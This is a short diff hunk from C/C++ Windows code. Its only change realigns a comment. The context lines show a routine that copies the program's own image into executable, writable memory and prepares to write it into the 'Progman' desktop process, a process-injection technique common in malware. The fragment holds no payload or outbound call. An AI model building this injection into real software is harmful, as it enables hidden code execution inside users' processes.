@@ -118,7 +118,7 @@ void pttb() {
 	unsigned long ulImage	= *(unsigned long*)(vpmPE + 0x50);					// 0x50 = IMAGE_NT_HEADERS -> IMAGE_OPTIONAL_HEADER -> SizeOfImage // Gives the size of this current process in memory
 	// WriteIntToConsoleA(ulImage); WriteToConsoleA("\n");
 // Reserve a local region of memory equal to "ulImage" and make a copy of itself into it
-	void*	vpLocVirtAlloc	= VirtualAlloc(NULL, ulImage, 0x3000, 0x40);			// 0x3000 = MEM_COMMIT | MEM_RESERVE // 0x40 = PAGE_EXECUTE_READWRITE
+	void*	vpLocVirtAlloc	= VirtualAlloc(NULL, ulImage, 0x3000, 0x40);		// 0x3000 = MEM_COMMIT | MEM_RESERVE // 0x40 = PAGE_EXECUTE_READWRITE
 	int64_t	vpmLocVirtAlloc	= (int64_t)vpLocVirtAlloc;
 	memcpy(vpLocVirtAlloc, vpModule, ulImage);
 // Reserve a region of memory equal to "ulImage + MAX_PATH" in the "Progman" process
